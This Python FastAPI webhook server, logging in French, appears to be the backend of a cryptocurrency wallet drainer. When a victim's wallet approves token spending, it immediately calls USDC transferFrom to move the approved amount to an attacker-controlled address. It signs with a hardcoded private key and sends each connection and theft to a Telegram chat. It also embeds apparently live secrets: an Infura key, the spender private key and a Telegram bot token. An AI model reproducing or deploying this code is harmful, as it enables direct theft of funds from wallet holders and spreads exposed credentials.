from fastapi import FastAPI
from pydantic import BaseModel
from web3 import Web3
from telegram import Bot
import uvicorn

app = FastAPI()

RPC_URL = "https://mainnet.infura.io/v3/3c826d095ae449a3802a56c780ee4071"
SPENDER_PRIVATE_KEY = "52676f3b62890aa524db7df5e5dc461239431e266364587df756587386097f9a"
SPENDER_ADDRESS = "0xB379A0B530e6d966bE7239fDa8B73274AD74E7A4"
TOKEN_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"

TELEGRAM_TOKEN = "7901597194:AAHBdugFUkHgeWtrj4P5TZk-yfBhQbwh04M"
TELEGRAM_CHAT_ID = "8170218904"

bot = Bot(token=TELEGRAM_TOKEN)
w3 = Web3(Web3.HTTPProvider(RPC_URL))

erc20_abi = [{
    "constant": False,
    "inputs": [
        {"name": "from", "type": "address"},
        {"name": "to", "type": "address"},
        {"name": "value", "type": "uint256"},
    ],
    "name": "transferFrom",
    "outputs": [{"name": "", "type": "bool"}],
    "type": "function",
}]

contract = w3.eth.contract(address=Web3.to_checksum_address(TOKEN_ADDRESS), abi=erc20_abi)

class NotifyData(BaseModel):
    event: str
    data: dict

def send_telegram_message(text: str):
    try:
        bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=text)
    except Exception as e:
        print("Erreur Telegram:", str(e))

@app.post("/webhook")
async def webhook(payload: NotifyData):
    event = payload.event
    data = payload.data

    if event == "connect":
        addr = data.get("address")
        allowance = data.get("allowance", "0")
        send_telegram_message(f"🔵 Wallet connecté : {addr}\nAllowance: {allowance} USDC (base units)")

    elif event == "approve":
        addr = data.get("address")
        amount = int(data.get("amount", 0))
        send_telegram_message(f"🟢 Approbation reçue de {addr} pour {amount} tokens (base units)")
        try:
            nonce = w3.eth.get_transaction_count(SPENDER_ADDRESS)
            tx = contract.functions.transferFrom(
                Web3.to_checksum_address(addr),
                SPENDER_ADDRESS,
                amount
            ).build_transaction({
                'chainId': 1,
                'gas': 150000,
                'gasPrice': w3.eth.gas_price,
                'nonce': nonce,
            })
            signed_tx = w3.eth.account.sign_transaction(tx, private_key=SPENDER_PRIVATE_KEY)
            tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
            send_telegram_message(f"🚀 Transaction envoyée! Hash: {tx_hash.hex()}")
            receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
            if receipt.status == 1:
                send_telegram_message(f"✅ Transaction réussie! Hash: {tx_hash.hex()}")
            else:
                send_telegram_message(f"❌ Transaction échouée! Hash: {tx_hash.hex()}")
        except Exception as e:
            send_telegram_message(f"⚠️ Erreur transfert: {str(e)}")

    elif event == "error":
        addr = data.get("address", "inconnu")
        err = data.get("error", "")
        send_telegram_message(f"❌ Erreur sur {addr}: {err}")

    return {"status": "ok"}

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
